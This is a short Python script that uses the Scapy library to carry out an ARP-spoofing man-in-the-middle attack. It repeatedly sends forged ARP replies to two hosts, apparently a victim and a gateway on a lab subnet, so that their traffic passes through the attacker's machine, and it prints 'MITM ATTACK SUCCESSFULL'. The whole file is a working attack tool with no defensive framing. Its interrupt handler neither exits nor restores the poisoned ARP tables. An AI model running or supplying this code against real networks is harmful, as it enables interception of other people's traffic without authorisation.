import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combine_packet = broadcast / arp_request
    answered = scapy.srp(combine_packet, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc

def arp_spoof(target_ip,impersonate_ip):
   pdst_ip = get_mac(target_ip)
   scapy_packet = scapy.ARP(op = 2, pdst = target_ip,hwdst = pdst_ip, psrc = impersonate_ip)
   scapy.send(scapy_packet,verbose=False)

packet_count = 0

while True:
   try:
    arp_spoof("10.0.2.4","10.0.2.1")
    arp_spoof("10.0.2.1","10.0.2.4")
    packet_count = packet_count + 2
    print("MITM ATTACK SUCCESSFULL" ,packet_count)
    time.sleep(2)

   except KeyboardInterrupt:
       print("Come back and have fun soon")

